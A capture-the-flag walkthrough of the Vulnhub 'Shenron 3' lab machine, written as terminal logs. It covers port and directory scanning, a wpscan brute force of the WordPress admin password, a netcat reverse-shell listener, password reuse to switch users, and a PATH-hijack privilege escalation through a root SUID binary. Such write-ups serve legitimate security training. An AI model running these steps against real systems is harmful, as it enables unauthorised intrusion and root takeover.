---
title: "Shenron 3 Vulnhub CTF Walkthrough"
---

nmap:
{% highlight terminal %}
┌──(kali㉿kali)-[~]
└─$ nmap -p- -sV 192.168.56.166
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-20 09:15 EDT
Nmap scan report for 192.168.56.166
Host is up (0.00034s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
{% endhighlight %}


gobuster:
{% highlight terminal %}
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://shenron/ -q -x php,txt,html
/index.php            (Status: 301) [Size: 0] [--> http://shenron/]
/wp-content           (Status: 301) [Size: 307] [--> http://shenron/wp-content/]
/wp-login.php         (Status: 200) [Size: 2126]                                
/license.txt          (Status: 200) [Size: 19935]                               
/wp-includes          (Status: 301) [Size: 308] [--> http://shenron/wp-includes/]
/readme.html          (Status: 200) [Size: 7342]                                 
/wp-trackback.php     (Status: 200) [Size: 135]                                  
/wp-admin             (Status: 301) [Size: 305] [--> http://shenron/wp-admin/]   
/xmlrpc.php           (Status: 405) [Size: 42]                                   
/wp-signup.php        (Status: 302) [Size: 0] [--> http://shenron/wp-login.php?action=register]
/server-status        (Status: 403) [Size: 272] 
{% endhighlight %}


{% highlight terminal %}


[!] Valid Combinations Found:
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://shenron/ -U admin -P /usr/share/wordlists/rockyou.txt

 | Username: admin, Password: iloverockyou
{% endhighlight %}

Setting up the reverse shell listener and getting low privilege shell:
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs]
└─$ nc -nlvp 6666                  
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::6666
Ncat: Listening on 0.0.0.0:6666
Ncat: Connection from 192.168.56.166.
Ncat: Connection from 192.168.56.166:56354.
Linux shenron 5.4.0-71-generic #79-Ubuntu SMP Wed Mar 24 10:56:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 19:18:04 up 33 min,  0 users,  load average: 0.00, 0.48, 1.18
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
{% endhighlight %}

Using find to locate SUID binaries
{% highlight terminal %}
www-data@shenron:/$ find -perm -u=s -type f 2>/dev/null
find -perm -u=s -type f 2>/dev/null
./usr/sbin/pppd
./usr/bin/fusermount
./usr/bin/newgrp
./usr/bin/umount
./usr/bin/gpasswd
./usr/bin/sudo
./usr/bin/chfn
./usr/bin/su
./usr/bin/chsh
./usr/bin/passwd
./usr/bin/mount
./usr/bin/pkexec
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
{% endhighlight %}

Getting the first flag: 
{% highlight terminal %}
www-data@shenron:/home$ su shenron
su shenron
Password: iloverockyou

shenron@shenron:/home$ cd
cd
shenron@shenron:~$ ls
ls
local.txt  network
shenron@shenron:~$ cat local.txt
cat local.txt
a57e2ff676cd040d58b375f686c7cedc
shenron@shenron:~$
{% endhighlight %}

#### Exploiting the PATH variable 
The user shenron has an SUID binary in the home directory that runs as root. 

{% highlight terminal %}
shenron@shenron:~$ ls -asl
ls -asl
total 60
 4 drwx------ 3 shenron shenron  4096 Apr 20 20:07 .
 4 drwxr-xr-x 3 root    root     4096 Apr 15 18:41 ..
 4 -rw------- 1 shenron shenron    48 Apr 20 20:39 .bash_history
 4 -rwx------ 1 shenron shenron   220 Apr 15 18:41 .bash_logout
 4 -rwx------ 1 shenron shenron  3771 Apr 15 18:41 .bashrc
 4 drwx------ 2 shenron shenron  4096 Apr 15 18:49 .cache
 4 -rwx------ 1 shenron shenron    33 Apr 16 10:20 local.txt
20 -rwsr-xr-x 1 root    root    16712 Apr 15 21:58 network
 4 -rwx------ 1 shenron shenron   807 Apr 15 18:41 .profile
 4 -rw-rw-r-- 1 shenron shenron    75 Apr 20 19:50 .selected_editor
 0 -rwx------ 1 shenron shenron     0 Apr 15 18:49 .sudo_as_admin_successful
 4 -rw------- 1 shenron shenron  1477 Apr 20 19:51 .viminfo
{% endhighlight %}

By using `ltrace ./network` we can see the system function call `netstat -nlutp` 
which means that the binary will use the PATH variable to find netstat
in the `/bin` directory and execute it.

Firstly, let's create the file that will launch a shell and save it as `netstat`:
{% highlight terminal %}
shenron@shenron:/tmp$ echo "/bin/bash" > netstat
{% endhighlight %}

Make it executable:
{% highlight terminal %}
shenron@shenron:/tmp$ chmod 777 netstat
chmod 777 netstat
{% endhighlight %}

Exporting PATH 
{% highlight terminal %}
shenron@shenron:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
{% endhighlight %}

Running `network` 
{% highlight terminal %}
shenron@shenron:~$ ./network
./network
root@shenron:~# 
{% endhighlight %}

Getting the root flag:
{% highlight terminal %}
cat root.txt
                                                               
  mmmm  #                                                 mmmm 
 #"   " # mm    mmm   m mm    m mm   mmm   m mm          "   "#
 "#mmm  #"  #  #"  #  #"  #   #"  " #" "#  #"  #           mmm"
     "# #   #  #""""  #   #   #     #   #  #   #   """       "#
 "mmm#" #   #  "#mm"  #   #   #     "#m#"  #   #         "mmm#"
                                                               
Your Root Flag Is Here :- a7ed78963dffd9450a34fcc4a0eecb98

Keep Supporting Me. ;-) 
{% endhighlight %}
